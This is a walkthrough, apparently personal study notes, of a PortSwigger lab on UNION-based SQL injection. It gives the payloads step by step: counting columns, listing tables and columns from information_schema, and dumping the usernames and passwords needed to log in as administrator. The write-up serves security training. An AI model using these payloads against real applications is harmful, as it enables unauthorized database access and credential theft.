[Source](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
## Task
This lab contains a SQL injection vulnerability in the product category filter. The query results are returned in the application response, so we can use a `UNION` attack to extract data from other tables.
The application has a login function, and the database contains a table that stores usernames and passwords. We need to determine the name of this table and the columns it contains, and then extract data from the table to get the username and password of all users.

Log in as the admin user to complete the lab.
## Solution
Go to the site
![[Pasted image 20241202191207.png]]
Select any category, intercept the request in `Burp Suite` and send it to `Repeater`
![[Pasted image 20241202191341.png]]
Find out how many columns and which column is displayed on the page
```SQL
'+UNION+SELECT+NULL,NULL--
```
Only 2 columns and they are both displayed
```SQL
'+UNION+SELECT+'1','2'--
```
![[Pasted image 20241202191627.png]]
Now we will display all the names tables
```SQL
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```
![[Pasted image 20241202192735.png]]
Next, we will output what columns are in the table `users_pbivkd`, which we found in the previous step
```SQL
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_pbivkd'--
```
![[Pasted image 20241202193930.png]]
We found the columns `username_lfsygz` and `password_tqbtwo`. Now we will output their contents one by one.
```SQL
'+UNION+SELECT+username_lfsygz,NULL+FROM+users_pbivkd--
```
![[Pasted image 20241202194117.png]]
Found `administrator`. He is the third in order. Now let's find his password
```SQL
'+UNION+SELECT+password_tqbtwo,NULL+FROM+users_pbivkd--
```
![[Pasted image 20241202194216.png]]
Or we can simply output everything at once
```SQL
'+UNION+SELECT+username_lfsygz,password_tqbtwo+FROM+users_pbivkd--
```
All that remains is to log in as administrator and that's it.